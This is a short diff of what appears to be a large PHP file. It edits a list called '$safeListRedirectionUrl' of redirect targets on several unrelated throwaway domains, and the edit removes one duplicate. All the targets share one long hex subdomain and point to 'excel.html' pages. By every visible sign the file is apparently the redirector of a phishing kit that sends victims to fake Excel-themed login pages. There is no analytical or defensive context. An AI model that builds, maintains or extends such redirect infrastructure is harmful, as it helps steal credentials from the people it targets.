@@ -7889,6 +7889,5 @@ $safeRedirectionUrl = '';
 $safeListRedirectionUrl = ['https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.emotrans.space/excel.html',
 'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.kccworld.online/excel.html',
 'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.only-relocation.com/excel.html',
-'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.topgreatak.com/excel.html', 
-'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.only-relocation.com/excel.html']  // Add more safe URLs as needed
+'https://8e916652d5cd160311997b3840b42293fdc75000ba7eb97592b46cce6e1093.topgreatak.com/excel.html']  // Add more safe URLs as needed
 ;
